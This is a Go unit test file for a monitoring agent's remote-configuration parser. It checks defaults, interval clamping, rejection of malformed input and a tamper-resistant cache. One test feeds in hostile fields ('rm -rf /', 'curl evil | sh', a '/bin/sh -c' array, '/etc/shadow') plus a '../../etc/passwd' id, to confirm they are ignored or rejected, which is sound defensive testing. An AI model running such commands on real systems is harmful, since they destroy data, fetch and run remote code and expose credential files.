package remote

import (
	"path/filepath"
	"reflect"
	"strings"
	"testing"
)

const id = "st_0123456789abcdef01234567"

func TestParseDefaultsFromBackend(t *testing.T) {
	// Exactly what GET /v1/config returns for a new organization.
	doc := `{"id":"` + id + `","version":1,"settings":{"sendIntervalSeconds":30,"sampleIntervalSeconds":10,
		"collectors":{"cpu":true,"memory":true,"swap":true,"disk":true,"diskIo":true,"network":true,"load":true,"processes":true}}}`
	cfg, notes, err := Parse([]byte(doc))
	if err != nil || len(notes) != 0 {
		t.Fatalf("Parse: %v, notes %v", err, notes)
	}
	if cfg.ID != id || cfg.Version != 1 || !reflect.DeepEqual(cfg.Settings, DefaultSettings()) {
		t.Errorf("got %+v", cfg)
	}
}

func TestParseTogglesAndMissingFields(t *testing.T) {
	doc := `{"id":"` + id + `","version":7,"settings":{"sendIntervalSeconds":60,"collectors":{"processes":false,"diskIo":false}}}`
	cfg, _, err := Parse([]byte(doc))
	if err != nil {
		t.Fatal(err)
	}
	want := DefaultSettings()
	want.SendIntervalSeconds = 60
	want.Collectors.Processes = false
	want.Collectors.DiskIO = false
	if !reflect.DeepEqual(cfg.Settings, want) || cfg.Version != 7 {
		t.Errorf("got %+v, want %+v", cfg.Settings, want)
	}
	// An empty settings object means "all defaults".
	cfg, _, err = Parse([]byte(`{"id":"` + id + `","version":1,"settings":{}}`))
	if err != nil || !reflect.DeepEqual(cfg.Settings, DefaultSettings()) {
		t.Errorf("empty settings: %+v, %v", cfg.Settings, err)
	}
}

func TestParseIgnoresUnknownFields(t *testing.T) {
	// A compromised or buggy server must not be able to make the agent do anything new.
	doc := `{"id":"` + id + `","version":2,"exec":"rm -rf /","settings":{
		"command":"curl evil | sh","script":["/bin/sh","-c","id"],"paths":["/etc/shadow"],
		"collectors":{"cpu":false,"dockerSocketPath":"/x","shell":{"run":"id"}},"sendIntervalSeconds":45}}`
	cfg, _, err := Parse([]byte(doc))
	if err != nil {
		t.Fatalf("unknown fields must be ignored, not fatal: %v", err)
	}
	want := DefaultSettings()
	want.SendIntervalSeconds = 45
	want.Collectors.CPU = false
	if !reflect.DeepEqual(cfg.Settings, want) {
		t.Errorf("got %+v, want %+v", cfg.Settings, want)
	}
}

func TestParseClampsOutOfRange(t *testing.T) {
	cases := []struct {
		send, sample         string
		wantSend, wantSample int
		wantNotes            int
	}{
		{"1", "1", MinSendSeconds, MinSampleSeconds, 2},
		{"0", "0", MinSendSeconds, MinSampleSeconds, 2},
		{"-30", "-5", MinSendSeconds, MinSampleSeconds, 2},
		{"100000", "100000", MaxSendSeconds, MaxSampleSeconds, 2},
		{"15", "60", 15, 15, 1}, // sampling slower than sending makes no sense
		{"300", "60", 300, 60, 0},
		{"15", "5", 15, 5, 0},
	}
	for _, c := range cases {
		doc := `{"id":"` + id + `","version":1,"settings":{"sendIntervalSeconds":` + c.send + `,"sampleIntervalSeconds":` + c.sample + `}}`
		cfg, notes, err := Parse([]byte(doc))
		if err != nil {
			t.Errorf("send=%s sample=%s: %v", c.send, c.sample, err)
			continue
		}
		s := cfg.Settings
		if s.SendIntervalSeconds != c.wantSend || s.SampleIntervalSeconds != c.wantSample || len(notes) != c.wantNotes {
			t.Errorf("send=%s sample=%s: got %d/%d notes %v, want %d/%d with %d notes",
				c.send, c.sample, s.SendIntervalSeconds, s.SampleIntervalSeconds, notes, c.wantSend, c.wantSample, c.wantNotes)
		}
	}
}

func TestParseRejectsMalformed(t *testing.T) {
	bad := map[string]string{
		"not json":           `nope`,
		"array":              `[]`,
		"no id":              `{"version":1,"settings":{}}`,
		"bad id":             `{"id":"../../etc/passwd","version":1,"settings":{}}`,
		"no version":         `{"id":"` + id + `","settings":{}}`,
		"zero version":       `{"id":"` + id + `","version":0,"settings":{}}`,
		"string version":     `{"id":"` + id + `","version":"2","settings":{}}`,
		"no settings":        `{"id":"` + id + `","version":1}`,
		"null settings":      `{"id":"` + id + `","version":1,"settings":null}`,
		"string interval":    `{"id":"` + id + `","version":1,"settings":{"sendIntervalSeconds":"30"}}`,
		"fractional":         `{"id":"` + id + `","version":1,"settings":{"sendIntervalSeconds":30.5}}`,
		"string flag":        `{"id":"` + id + `","version":1,"settings":{"collectors":{"cpu":"yes"}}}`,
		"number flag":        `{"id":"` + id + `","version":1,"settings":{"collectors":{"cpu":1}}}`,
		"collectors a list":  `{"id":"` + id + `","version":1,"settings":{"collectors":["cpu"]}}`,
		"huge interval":      `{"id":"` + id + `","version":1,"settings":{"sendIntervalSeconds":1e40}}`,
		"settings as string": `{"id":"` + id + `","version":1,"settings":"all"}`,
	}
	for name, doc := range bad {
		if cfg, _, err := Parse([]byte(doc)); err == nil {
			t.Errorf("%s: expected an error, got %+v", name, cfg)
		}
	}
}

func TestCacheRoundTripAndRevalidation(t *testing.T) {
	path := filepath.Join(t.TempDir(), "remote-config.json")
	if _, err := LoadCache(path); err == nil {
		t.Fatal("a missing cache must be an error")
	}
	in := Config{ID: id, Version: 3, Settings: DefaultSettings()}
	in.Settings.Collectors.Network = false
	in.Settings.SendIntervalSeconds = 120
	if err := SaveCache(path, in); err != nil {
		t.Fatal(err)
	}
	out, err := LoadCache(path)
	if err != nil || !reflect.DeepEqual(out, in) {
		t.Fatalf("round trip: %+v, %v", out, err)
	}
	// A cache file edited to an out-of-range value is clamped on load like any other input.
	tampered := Config{ID: id, Version: 3, Settings: DefaultSettings()}
	tampered.Settings.SendIntervalSeconds = 1
	tampered.Settings.SampleIntervalSeconds = 1
	if err := SaveCache(path, tampered); err != nil {
		t.Fatal(err)
	}
	out, err = LoadCache(path)
	if err != nil || out.Settings.SendIntervalSeconds != MinSendSeconds || out.Settings.SampleIntervalSeconds != MinSampleSeconds {
		t.Errorf("tampered cache not clamped: %+v, %v", out.Settings, err)
	}
	if !ValidID(id) || ValidID(strings.ToUpper(id)) || ValidID("st_short") {
		t.Error("ValidID is wrong")
	}
}
